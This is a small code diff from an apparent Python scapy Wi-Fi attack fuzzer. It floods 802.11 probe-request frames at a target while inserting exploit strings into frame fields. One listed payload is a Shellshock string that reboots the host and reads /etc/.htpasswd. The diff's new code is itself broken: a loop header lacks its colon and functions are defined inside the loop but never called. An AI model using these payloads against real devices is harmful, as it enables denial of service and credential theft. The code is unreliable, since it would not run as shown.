@@ -34,10 +34,9 @@ def engine():
     sshock  = ["env x='() { :;}; reboot' bash -c cat /etc/.htpasswd"]
     exploits = [fmts, rce, io, bonull, bofull, sshock]
     for x in exploits[:]:
-      for i in x[:]:
-		def fuzzProbeDeltID():
-          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID=str(i), info='00'
-          )
+      for i in x[:]
+        def fuzzProbeDeltID():
+          srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/Dot11ProbeReq()/Dot11Elt(ID=str(i), info='00')
 
         def fuzzProbeDeltLEN(): 
           srpflood(RadioTap()/Dot11(type=0,subtype=4,addr2=server)/fuzz(Dot11ProbeReq())/Dot11Elt(ID='SSID', len=str(i), info='00')
